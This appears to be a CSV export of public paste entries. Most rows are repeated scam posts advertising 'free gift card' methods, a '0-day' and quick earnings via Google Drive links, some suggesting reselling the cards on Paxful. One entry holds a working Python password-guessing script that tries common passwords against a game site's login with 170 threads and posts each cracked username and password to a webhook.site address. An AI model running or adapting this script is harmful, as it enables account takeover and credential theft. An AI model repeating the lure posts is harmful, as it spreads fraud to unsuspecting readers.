id,title,username,language,date,content
cy6Z9HH5,This method is now public,NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:03:32 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?mUTnfXRQRC

We just dropped a new 0-day, it's public now. It's gonna be patched in a few days so enjoy while it still works"
GYZjsjzk,New 0-day exploit (online marketplace),NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:03:19 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?dkWcPP8acc leaked by 0-day team

(zerodayleaks on telegram)"
c9q75NDu,⭐Free Giftcards Method⭐August 2024,NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:03:05 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?VE11Kjoudp

Hadez gift cards method

You can use it to get any gift card completely for free"
0364KdPj,G2A Timezone Glitch,NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:02:53 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?LSasg9iWfu

Hadez gift cards method

You can use it to get any gift card completely for free"
LpiEEWe1,Amazon Giftcards,NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:02:41 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?AMmn9be99b

Hadez gift cards method

You can use it to get any gift card completely for free"
PnZJNAsh,Leaked by Zack,NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:02:29 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?4aHrorm6bL

Hadez gift cards method

You can use it to get any gift card completely for free"
yNfATKTq,Private guide,NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:02:18 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?DDkEWW5JGd

just use this method to get a gift card for free, then sell it on Paxful for instant profit"
Rfaw5sPr,❤️ MAKE $500 IN 15 MINUTES ❤,NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:02:06 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?dUizmbXw23

Hadez gift cards method

You can use it to get any gift card completely for free"
ZLzSCB1e,This method is now public,NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:01:54 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?vFX9g4LGkk

We just dropped a new 0-day, it's public now. It's gonna be patched in a few days so enjoy while it still works"
t6z4F3FF,New 0-day exploit (online marketplace),NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:01:42 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?3kQbKcNW07 leaked by 0-day team

(zerodayleaks on telegram)"
DPBxnkdg,ehnor,kelgd12,JavaScript,Thursday 15th of August 2024 01:01:39 PM CDT,"import requests
import random
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

def fetch_nicks_from_api():
    url = ""https://fakerapi.it/api/v1/custom?_quantity=2000&_locale=en_US&first_name=firstName""
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()[""data""]
        return [item[""first_name""] for item in data]
    else:
        print(f""Erro ao obter nicks da API: {response.status_code}"")
        return []

def generate_random_number():
    return random.randint(1720000000000, 1729999999999)

def login_gartic(nick, senha):
    rand = generate_random_number()
    url = f""https://www.gartik.com/log_ajax.php?rand={rand}""

    payload = {
        ""userLogin"": nick,
        ""senhaLogin"": senha
    }

    try:
        response = requests.post(url, data=payload)
        response_data = response.json()

        if ""erro"" in response_data:
            print(f""Falha no login com nick: {nick} e senha: {senha}"")
            return {""erro"": True, ""mensagem"": response_data[""erro""]}
        else:
            print(f""Sucesso no login com nick: {nick} e senha: {senha}"")
            return response_data

    except requests.exceptions.RequestException as e:
        print(f""Erro de requisição para nick: {nick} e senha: {senha}: {e}"")
        return {""erro"": True, ""mensagem"": str(e)}

def try_login_with_nick_and_passwords(nick, passwords, successful_logins):
    clean_nick = nick.replace(""_"", """")
    nick_without_numbers = ''.join(filter(lambda x: not x.isdigit(), nick))

    senhas_a_tentar = [nick, clean_nick, nick_without_numbers] + \
                      [nick + suffix for suffix in [""123"", ""1234"", ""12345""]] + \
                      [clean_nick + suffix for suffix in [""123"", ""1234"", ""12345""]] + \
                      passwords

    for senha in senhas_a_tentar:
        print(f""Tentando login com nick: {nick} e senha: {senha}"")
        response = login_gartic(nick, senha)
        if response.get(""erro""):
            continue
        else:
            login_data = {
                ""userLogin"": response[""userLogin""],
                ""senha"": senha,
                ""pontos"": response[""pontos""],
                ""vitorias"": response[""vitorias""]
            }
            # Prioridade para enviar ao Webhook
            send_webhook_notification(response['userLogin'], senha, response['pontos'], response['vitorias'])

            # Salva o login bem-sucedido
            successful_logins.append(login_data)
            save_to_json(successful_logins)
            return login_data  # Retorna o resultado completo para o console

    return False

def save_to_json(data):
    with open(""successful_logins.json"", ""w"") as file:
        json.dump(data, file, indent=4)

def generate_year_passwords():
    year_passwords = []
    for year in range(1980, 2024):
        year_passwords.append(str(year))
    return year_passwords

def send_webhook_notification(userLogin, senha, pontos, vitorias):
    webhook_url = ""https://webhook.site/2b1ba509-12dd-461b-97a3-2c56f741feb7""

    payload = {
        ""text"": f""Nick: {userLogin} | Senha: {senha} | Pontos: {pontos} | Vitórias: {vitorias}""
    }

    try:
        requests.post(webhook_url, data=payload)
    except requests.exceptions.RequestException as e:
        print(f""Erro ao enviar notificação para o Webhook: {e}"")

def main():
    print(""O script foi iniciado."")

    nicks = fetch_nicks_from_api()  # Obtém nicks da API
    common_passwords = [""123"", ""1234"", ""12345"", ""123456"", ""1234567890"", ""01234"", ""012345"", ""123456789"",
                        ""gartic"", ""gartic123"", ""gartic1234"", ""gartic12345"",
                        ""0000"", ""000"", ""00000"", ""000000"", ""gartic123456"", ""0123"", ""senha"", ""nick"", ""password"", ""qwerty"",
                        ""654321"", ""987654321"", ""321"", ""4321"", ""111111"", ""admin"", ""123123""]
    year_passwords = generate_year_passwords()

    passwords_to_try = common_passwords + year_passwords

    successful_logins = []

    try:
        with open(""successful_logins.json"", ""r"") as file:
            successful_logins = json.load(file)
    except FileNotFoundError:
        pass

    with ThreadPoolExecutor(max_workers=170) as executor:
        futures = []
        for nick in nicks:
            future = executor.submit(try_login_with_nick_and_passwords, nick, passwords_to_try, successful_logins)
            futures.append(future)

        for future in as_completed(futures):
            try:
                result = future.result()
                if result and isinstance(result, dict):  # Certifica-se de que o resultado é um dicionário válido
                    print(f""Login bem-sucedido para o nick: {result['userLogin']}"")
            except Exception as exc:
                print(f""Exceção ao tentar fazer login: {exc}"")

    save_to_json(successful_logins)

    print(""O script foi finalizado."")

if __name__ == ""__main__"":
    main()"
qYfL8K3y,⭐Free Giftcards Method⭐August 2024,NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:01:28 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?NNYwj2dBxz

Hadez gift cards method

You can use it to get any gift card completely for free"
uQ9wHe3P,G2A Timezone Glitch,NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:01:07 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?L4juj0Ldj0

Hadez gift cards method

You can use it to get any gift card completely for free"
5K52TPcJ,Amazon Giftcards,NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:00:55 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?DFEy8hAuV5

Hadez gift cards method

You can use it to get any gift card completely for free"
hVLykXA3,Leaked by Zack,NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:00:43 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?ZtH6I7bdDd

Hadez gift cards method

You can use it to get any gift card completely for free"
guG8fCjg,Private guide,NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:00:30 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?0uccVcaKdm

just use this method to get a gift card for free, then sell it on Paxful for instant profit"
MMWkxmnj,❤️ MAKE $500 IN 15 MINUTES ❤,NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:00:17 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?Ky0EBrM4vi

Hadez gift cards method

You can use it to get any gift card completely for free"
3Bk8Hths,This method is now public,NzX_RaVe,JavaScript,Thursday 15th of August 2024 01:00:04 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?3Ew1Rf0wXI

We just dropped a new 0-day, it's public now. It's gonna be patched in a few days so enjoy while it still works"
AjCu6s7f,New 0-day exploit (online marketplace),NzX_RaVe,JavaScript,Thursday 15th of August 2024 12:59:52 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?jOxDZe9PsY leaked by 0-day team

(zerodayleaks on telegram)"
ZDChSJ3q,⭐Free Giftcards Method⭐August 2024,NzX_RaVe,JavaScript,Thursday 15th of August 2024 12:59:41 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?yTgbWuQPjC

Hadez gift cards method

You can use it to get any gift card completely for free"
vDezCx72,❤️ MAKE $500 IN 15 MINUTES ❤,scandalo,JavaScript,Thursday 15th of August 2024 12:59:27 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?ZkyPRFiZec

Hadez gift cards method

You can use it to get any gift card completely for free"
gBsBxzar,This method is now public,scandalo,JavaScript,Thursday 15th of August 2024 12:59:14 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?a4eVmEhUmT

We just dropped a new 0-day, it's public now. It's gonna be patched in a few days so enjoy while it still works"
3Qzy0sGz,New 0-day exploit (online marketplace),scandalo,JavaScript,Thursday 15th of August 2024 12:59:02 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?v1VOWj4wTF leaked by 0-day team

(zerodayleaks on telegram)"
DFSUsjdN,⭐Free Giftcards Method⭐August 2024,scandalo,JavaScript,Thursday 15th of August 2024 12:58:50 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?m6LVetmSi2

Hadez gift cards method

You can use it to get any gift card completely for free"
xbXyzaDJ,⭐Free Giftcards Method⭐August 2024,HankGiveCookie,JavaScript,Thursday 15th of August 2024 12:58:50 PM CDT,"Guide:

https://drive.google.com/file/d/1KSUu10a3I_Rpmq553EILa4YPkBcJuHs4/view?usp=drive_link

Lines gift cards method

You can use it to get any gift card completely for free

#81663696
"
QC8NbhmY,❤️ MAKE $500 IN 15 MINUTES ❤,HankGiveCookie,JavaScript,Thursday 15th of August 2024 12:58:39 PM CDT,"Guide:

https://drive.google.com/file/d/1KSUu10a3I_Rpmq553EILa4YPkBcJuHs4/view?usp=drive_link

Lines gift cards method

You can use it to get any gift card completely for free

#75363000
"
uTne8BLK,G2A Timezone Glitch,scandalo,JavaScript,Thursday 15th of August 2024 12:58:38 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?wr2DrA99T8

Hadez gift cards method

You can use it to get any gift card completely for free"
U43wP2vZ,❤️EARN $900 IN 10 MINUTES❤️,HankGiveCookie,JavaScript,Thursday 15th of August 2024 12:58:28 PM CDT,"Guide:

https://drive.google.com/file/d/1KSUu10a3I_Rpmq553EILa4YPkBcJuHs4/view?usp=drive_link

Lines gift cards method

You can use it to get any gift card completely for free

#35913135
"
tK7MrQ3M,Amazon Giftcards,scandalo,JavaScript,Thursday 15th of August 2024 12:58:26 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?gfC2RPBNMs

Hadez gift cards method

You can use it to get any gift card completely for free"
0piXGrDS,⭐️EARN $500 INSTANTLY August 2024⭐️,HankGiveCookie,JavaScript,Thursday 15th of August 2024 12:58:16 PM CDT,"Guide:

https://drive.google.com/file/d/1KSUu10a3I_Rpmq553EILa4YPkBcJuHs4/view?usp=drive_link

Lines gift cards method

You can use it to get any gift card completely for free

#46037590
"
FWg8p8C8,Leaked by Zack,scandalo,JavaScript,Thursday 15th of August 2024 12:58:14 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?MbjmooYy1Y

Hadez gift cards method

You can use it to get any gift card completely for free"
PgUPaPDK,⭐Free Giftcards Method⭐August 2024,HankGiveCookie,JavaScript,Thursday 15th of August 2024 12:58:05 PM CDT,"Guide:

https://drive.google.com/file/d/1KSUu10a3I_Rpmq553EILa4YPkBcJuHs4/view?usp=drive_link

Lines gift cards method

You can use it to get any gift card completely for free

#32286422
"
RE3FJx9s,Private guide,scandalo,JavaScript,Thursday 15th of August 2024 12:58:02 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?f1TcIZAXv4

just use this method to get a gift card for free, then sell it on Paxful for instant profit"
4vSCvxWT,❤️ MAKE $500 IN 15 MINUTES ❤,Happyzzzzzzzz,JavaScript,Thursday 15th of August 2024 12:57:54 PM CDT,"Guide:

https://drive.google.com/file/d/1KSUu10a3I_Rpmq553EILa4YPkBcJuHs4/view?usp=drive_link

Lines gift cards method

You can use it to get any gift card completely for free

#18349010
"
WCP0PuSD,❤️ MAKE $500 IN 15 MINUTES ❤,scandalo,JavaScript,Thursday 15th of August 2024 12:57:48 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?GGlW3ekzu5

Hadez gift cards method

You can use it to get any gift card completely for free"
dqx4WzKh,❤️EARN $900 IN 10 MINUTES❤️,Happyzzzzzzzz,JavaScript,Thursday 15th of August 2024 12:57:42 PM CDT,"Guide:

https://drive.google.com/file/d/1KSUu10a3I_Rpmq553EILa4YPkBcJuHs4/view?usp=drive_link

Lines gift cards method

You can use it to get any gift card completely for free

#86922876
"
MRjwKpaV,This method is now public,scandalo,JavaScript,Thursday 15th of August 2024 12:57:36 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?ezWhrxe8MF

We just dropped a new 0-day, it's public now. It's gonna be patched in a few days so enjoy while it still works"
dLKBeJRM,⭐️EARN $500 INSTANTLY August 2024⭐️,Happyzzzzzzzz,JavaScript,Thursday 15th of August 2024 12:57:31 PM CDT,"Guide:

https://drive.google.com/file/d/1KSUu10a3I_Rpmq553EILa4YPkBcJuHs4/view?usp=drive_link

Lines gift cards method

You can use it to get any gift card completely for free

#38731900
"
NYb671Sz,New 0-day exploit (online marketplace),scandalo,JavaScript,Thursday 15th of August 2024 12:57:24 PM CDT,"Guide:

https://drive.google.com/file/d/1Mzn6o3n5xIhN6nueBAl3YTzyb27ZgMrD/view?O5Pfl5uLGP leaked by 0-day team

(zerodayleaks on telegram)"
ZsSnsWkX,⭐Free Giftcards Method⭐August 2024,Happyzzzzzzzz,JavaScript,Thursday 15th of August 2024 12:57:19 PM CDT,"Guide:

https://drive.google.com/file/d/1KSUu10a3I_Rpmq553EILa4YPkBcJuHs4/view?usp=drive_link

Lines gift cards method

You can use it to get any gift card completely for free

#79785266
"
